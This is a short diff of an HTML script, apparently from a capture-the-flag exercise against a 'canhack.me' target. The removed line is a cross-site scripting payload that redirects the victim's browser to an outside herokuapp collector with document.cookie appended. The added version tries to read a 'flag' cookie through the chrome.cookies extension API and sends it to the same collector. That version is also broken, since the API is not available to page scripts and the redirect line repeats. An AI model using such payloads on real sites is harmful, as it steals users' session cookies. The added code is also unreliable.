@@ -1,1 +1,9 @@
-<script>window.location.replace("https://challengeuse.herokuapp.com/getCookie.html\?"+document.cookie)</script>
+<script>
+  var myUrl = "https://json.canhack.me/tester"; // assuming that this is the url
+
+  chrome.cookies.get({url: myUrl, name: 'flag'}, function(cookie) {
+      // do something with the cookie
+      window.location.href = "https://challengeuse.herokuapp.com/getCookie.html\?"+cookie
+      window.location.href = "https://challengeuse.herokuapp.com/getCookie.html\?"+cookie.value
+  });
+</script>
